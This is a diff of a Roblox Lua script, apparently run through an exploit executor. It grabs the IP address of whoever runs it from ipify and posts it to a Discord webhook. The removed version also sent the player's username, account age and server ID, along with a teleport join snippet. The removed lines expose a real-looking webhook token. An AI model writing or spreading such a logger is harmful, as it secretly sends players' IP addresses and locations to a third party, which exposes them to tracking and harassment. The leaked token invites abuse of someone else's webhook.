@@ -1,46 +1,40 @@
 -- Replace this URL with your Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"
+local webhookUrl = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
 
-local player = game.Players.LocalPlayer
-local username = player.Name
-local accountAge = player.AccountAge
-local gameUsername = player.DisplayName -- Use DisplayName for the in-game username
-local serverId = game.JobId -- Use JobId for the server ID
-local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username
-local ip = "https://www.ipify.org/"
+-- Retrieve IP address
+local ip = game:HttpGet("https://api.ipify.org")
 
-
-local joinScript = "```lua\nEXECUTE THIS TO JOIN THEIR SERVER: \npcall(function() game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, \"" .. serverId .. "\", game:GetService(\"Players\").LocalPlayer) end)\n```"
-
-local payload = {
+-- Prepare data for the POST request
+local data = {
+    username = "The Rake",
+    avatar_url = "https://th.bing.com/th/id/OIP.-M26uq0243bsJB97pgaZlQHaEK?w=319&h=180&c=7&r=0&o=5&dpr=1.5&pid=1.7",
     content = nil,
     embeds = {
         {
             title = "Script Has Been Executed!",
-            description = "Username: " .. username .. "\nGame Username: " .. gameUsername .. "\nIp Address :" .. ip.Value .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
-            color = nil,
-            image = {
-                url = avatarUrl
-            }
+            description = "IP Address: " .. tostring(ip),
+            color = nil
         }
-    },
-    username = "The Rake",
-    avatar_url = "https://th.bing.com/th/id/OIP.-M26uq0243bsJB97pgaZlQHaEK?w=319&h=180&c=7&r=0&o=5&dpr=1.5&pid=1.7",
-    attachments = {}
+    }
 }
 
-local payloadJson = game:GetService("HttpService"):JSONEncode(payload)
+-- Convert data to JSON
+local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
+-- Set up headers
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+-- Make the HTTP request
 local httpRequest = syn and (syn.request or http.request) or http_request or request or httprequest
 
 if httpRequest then
     local response = httpRequest({
         Url = webhookUrl,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = payloadJson
+        Headers = headers,
+        Body = jsonData
     })
 
     -- Optionally, you can print the response to check for errors
